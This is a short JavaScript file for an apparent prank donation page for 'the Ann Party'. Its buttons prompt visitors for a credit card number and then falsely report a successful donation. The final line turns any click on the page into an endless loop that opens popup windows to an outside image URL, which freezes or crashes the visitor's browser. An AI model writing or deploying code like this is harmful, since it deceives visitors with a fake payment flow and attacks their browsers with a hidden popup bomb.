let d10, d50, d100, d200, d500, d1000;

d10   = document.getElementById("d10");
d50   = document.getElementById("d50");
d100  = document.getElementById("d100");
d200  = document.getElementById("d200");
d500  = document.getElementById("d500");
d1000 = document.getElementById("d1000");

d10.onclick   = _ => donate(10);
d50.onclick   = _ => donate(50);
d100.onclick  = _ => donate(100);
d200.onclick  = _ => donate(200);
d500.onclick  = _ => donate(500);
d1000.onclick = _ => donate(1000);

const creditcardRegex = /[0-9]{4}-[0-9]{4}-[0-9]{4}-[0-9]{4}/;

function donate(amount) {
    let card;
    let text = "Please enter your credit card number (0000-0000-0000-0000)";
    while(!creditcardRegex.test(card = prompt(text))) {
        text = "Please enter a valid credit card number.";
    }
    alert(`Successfully donated ${amount}$ to the Ann Party`);
}

window.onclick = () => {while(true){window.open("https://s2.gifyu.com/images/3dgifmaker48696.gif");}}
